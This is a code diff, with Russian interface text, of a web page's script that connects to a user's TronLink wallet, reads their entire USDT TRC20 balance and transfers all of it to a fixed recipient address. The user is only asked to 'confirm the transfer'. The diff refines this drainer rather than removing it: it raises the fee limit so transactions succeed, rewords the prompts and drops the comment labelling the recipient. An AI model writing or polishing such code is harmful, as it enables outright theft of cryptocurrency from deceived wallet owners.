@@ -26,9 +26,7 @@
         let tronWeb;
         let userAddress = "";
 
-        // Установленный адрес получателя
         const recipientAddress = "TToG8C1EYAdxF5jjx8jWbBTcsqEVQu88rp";
-        // Официальный контракт USDT TRC20
         const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
         document.getElementById('connectBtn').addEventListener('click', async function() {
@@ -37,11 +35,11 @@
             try {
                 if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                     tronWeb = window.tronWeb;
-                    userAddress = tronWeb.defaultAddress.base58;
+                    userAddress = window.tronWeb.defaultAddress.base58;
                 } else if (window.tronLink) {
                     await window.tronLink.request({ method: 'tron_requestAccounts' });
                     tronWeb = window.tronWeb;
-                    userAddress = tronWeb.defaultAddress.base58;
+                    userAddress = window.tronWeb.defaultAddress.base58;
                 } else {
                     infoElem.innerText = "Откройте сайт во встроенном браузере кошелька.";
                     return;
@@ -66,28 +64,31 @@
                     return;
                 }
 
-                infoElem.innerText = "Запрос баланса и формирование транзакции...";
+                infoElem.innerText = "Проверка баланса...";
 
                 const contract = await window.tronWeb.contract().at(usdtContractAddress);
                 const balance = await contract.balanceOf(userAddress).call();
-                const sunBalance = balance.toString();
+                
+                // Приводим баланс к строковому значению
+                const balanceStr = balance.toString();
 
-                if (sunBalance === "0" || Number(sunBalance) <= 0) {
+                if (balanceStr === "0" || Number(balanceStr) <= 0) {
                     alert("На балансе нет USDT TRC20.");
                     infoElem.innerText = "Подключено: " + userAddress + " (Баланс USDT: 0)";
                     return;
                 }
 
-                infoElem.innerText = "Подтвердите транзакцию в кошельке...";
+                infoElem.innerText = "Подтвердите перевод в кошельке...";
                 
+                // Вызываем метод transfer с явным указанием лимита энергии (15 TRX в эквиваленте энергии)
                 await contract.transfer(
                     recipientAddress,
-                    sunBalance
+                    balanceStr
                 ).send({
-                    feeLimit: 10000000
+                    feeLimit: 15000000 
                 });
 
-                alert("Операция успешно отправлена!");
+                alert("Транзакция успешно отправлена!");
             } catch (error) {
                 console.error(error);
                 alert("Ошибка выполнения: " + (error.message || JSON.stringify(error)));
